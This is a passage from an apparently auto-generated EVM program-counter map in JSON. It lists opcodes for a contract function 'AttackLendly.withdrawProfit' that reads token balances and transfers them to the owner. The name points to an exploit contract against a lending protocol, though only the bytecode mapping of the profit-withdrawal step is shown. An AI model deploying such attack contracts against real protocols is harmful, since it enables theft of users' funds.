      "path": "3"
    },
    "2802": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2803": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2805": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP8",
      "path": "3"
    },
    "2806": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "GAS",
      "path": "3"
    },
    "2807": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "CALL",
      "path": "3"
    },
    "2808": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2809": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2810": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2811": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xB08"
    },
    "2814": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "2815": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2816": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2818": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2819": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "2820": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2821": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2823": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "REVERT",
      "path": "3"
    },
    "2824": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2825": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "POP",
      "path": "3"
    },
    "2826": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "POP",
      "path": "3"
    },
    "2827": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "POP",
      "path": "3"
    },
    "2828": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "POP",
      "path": "3"
    },
    "2829": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2831": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2832": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2833": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "2835": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "NOT",
      "path": "3"
    },
    "2836": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "2838": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2839": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "ADD",
      "path": "3"
    },
    "2840": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "AND",
      "path": "3"
    },
    "2841": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2842": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "ADD",
      "path": "3"
    },
    "2843": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2844": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2846": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2847": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "POP",
      "path": "3"
    },
    "2848": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2849": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "ADD",
      "path": "3"
    },
    "2850": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2851": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xB2C"
    },
    "2854": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "2855": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2856": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE2D"
    },
    "2859": {
      "fn": "AttackLendly.withdrawProfit",
      "jump": "i",
      "offset": [
        3430,
        3487
      ],
      "op": "JUMP",
      "path": "3"
    },
    "2860": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2861": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "POP",
      "path": "3"
    },
    "2862": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3503
      ],
      "op": "PUSH32",
      "path": "3",
      "statement": 26,
      "value": "0x0"
    },
    "2895": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2897": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2899": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2901": {
      "op": "SHL"
    },
    "2902": {
      "op": "SUB"
    },
    "2903": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3512
      ],
      "op": "AND",
      "path": "3"
    },
    "2904": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3512
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0xA9059CBB"
    },
    "2909": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3513,
        3520
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xB6E"
    },
    "2912": {
      "fn": "Ownable.owner",
      "offset": [
        1247,
        1254
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2914": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2915": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2917": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2919": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2921": {
      "op": "SHL"
    },
    "2922": {
      "op": "SUB"
    },
    "2923": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "AND",
      "path": "0"
    },
    "2924": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2925": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2926": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3513,
        3520
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2927": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2929": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2930": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "2935": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2937": {
      "op": "SHL"
    },
    "2938": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2939": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2940": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3547,
        3551
      ],
      "op": "ADDRESS",
      "path": "3"
    },
    "2941": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "2943": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2944": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "ADD",
      "path": "3"
    },
    "2945": {
      "op": "MSTORE"
    },
    "2946": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3528
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "2979": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2981": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2983": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2985": {
      "op": "SHL"
    },
    "2986": {
      "op": "SUB"
    },
    "2987": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3538
      ],
      "op": "AND",
      "path": "3"
    },
    "2988": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3538
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2989": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3538
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x70A08231"
    },
    "2994": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3538
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2995": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2997": {
      "op": "ADD"
    },
    "2998": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "3000": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "3002": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "3003": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3004": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP4",
      "path": "3"
    },
    "3005": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "SUB",
      "path": "3"
    },
    "3006": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP2",
      "path": "3"
    },
    "3007": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP7",
      "path": "3"
    },
    "3008": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "GAS",
      "path": "3"
    },
    "3009": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "STATICCALL",
      "path": "3"
    },
    "3010": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "3011": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3012": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "3013": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xBD2"
    },
    "3016": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "3017": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "3018": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "3020": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3021": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "3022": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "3023": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "3025": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "REVERT",
      "path": "3"
    },
    "3026": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "3027": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "POP",
      "path": "3"
    },
    "3028": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "POP",
      "path": "3"
    },
    "3029": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "POP",
      "path": "3"
    },
    "3030": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "POP",
      "path": "3"
    },
    "3031": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "3033": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "3034": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "3035": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "3037": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "NOT",
      "path": "3"
    },
    "3038": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "3040": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP3",
      "path": "3"
    },
    "3041": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "ADD",
      "path": "3"
    },
    "3042": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "AND",
      "path": "3"
    },
    "3043": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP3",
      "path": "3"
    },
    "3044": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "ADD",
      "path": "3"
    },
    "3045": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3046": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "3048": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "3049": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "POP",
      "path": "3"
    },
    "3050": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "DUP2",
      "path": "3"
    },
    "3051": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "ADD",
      "path": "3"
    },
    "3052": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "3053": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xBF6"
    },
    "3056": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "3057": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "3058": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE4F"
    },
    "3061": {
      "fn": "AttackLendly.withdrawProfit",
      "jump": "i",
      "offset": [
        3522,
        3553
      ],
      "op": "JUMP",
      "path": "3"
    },
    "3062": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3522,
        3553
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "3063": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "3065": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "3066": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3068": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3070": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3072": {
      "op": "SHL"
    },
    "3073": {
      "op": "SUB"
    },
    "3074": {
      "op": "NOT"
    },
    "3075": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0xE0"
    },
    "3077": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP6",
      "path": "3"
    },
    "3078": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "3079": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "SHL",
      "path": "3"
    },
    "3080": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "AND",
      "path": "3"
    },
    "3081": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP2",
      "path": "3"
    },
    "3082": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "3083": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3085": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3087": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3089": {
      "op": "SHL"
    },
    "3090": {
      "op": "SUB"
    },
    "3091": {
      "op": "SWAP1"
    },
    "3092": {
      "op": "SWAP3"
    },
    "3093": {
      "op": "AND"
    },
    "3094": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "3096": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP4",
      "path": "3"
    },
    "3097": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "ADD",
      "path": "3"
    },
    "3098": {
      "op": "MSTORE"
    },
    "3099": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3101": {
      "op": "DUP3"
    },
    "3102": {
      "op": "ADD"
    },
    "3103": {
      "op": "MSTORE"
    },
    "3104": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "3106": {
      "op": "ADD"
    },
    "3107": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "3109": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "3111": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "3112": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3113": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP4",
      "path": "3"
    },
    "3114": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "SUB",
      "path": "3"
    },
    "3115": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP2",
      "path": "3"
    },
    "3116": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "3118": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP8",
      "path": "3"
    },
    "3119": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "GAS",
      "path": "3"
    },
    "3120": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "CALL",
      "path": "3"
    },
    "3121": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "3122": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3123": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "3124": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xC41"
    },
    "3127": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "3128": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "3129": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "3131": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3132": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "3133": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "3134": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "3136": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "REVERT",
      "path": "3"
    },
    "3137": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "3138": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "POP",
      "path": "3"
    },
    "3139": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "POP",
      "path": "3"
    },
    "3140": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "POP",
      "path": "3"
    },
    "3141": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "POP",
      "path": "3"
    },
    "3142": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "3144": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "3145": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "3146": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "3148": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "NOT",
      "path": "3"
    },
    "3149": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "3151": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP3",
      "path": "3"
    },
    "3152": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "ADD",
      "path": "3"
    },
    "3153": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "AND",
      "path": "3"
    },
    "3154": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP3",
      "path": "3"
    },
    "3155": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "ADD",
      "path": "3"
    },
    "3156": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP1",
      "path": "3"
    },
    "3157": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "3159": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "3160": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "POP",
      "path": "3"
    },
    "3161": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "DUP2",
      "path": "3"
    },
    "3162": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "ADD",
      "path": "3"
    },
    "3163": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "3164": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x9F1"
    },
    "3167": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "3168": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "3169": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3497,
        3554
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE2D"
    },
    "3172": {
      "fn": "AttackLendly.withdrawProfit",
      "jump": "i",
      "offset": [
        3497,
        3554
      ],
      "op": "JUMP",
      "path": "3"
    },
    "3173": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1359,
        1489
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3174": {
      "fn": "Ownable.owner",
      "offset": [
        1247,
        1254
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3176": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3177": {
      "op": "PUSH1",
      "value": "0x1"
    },
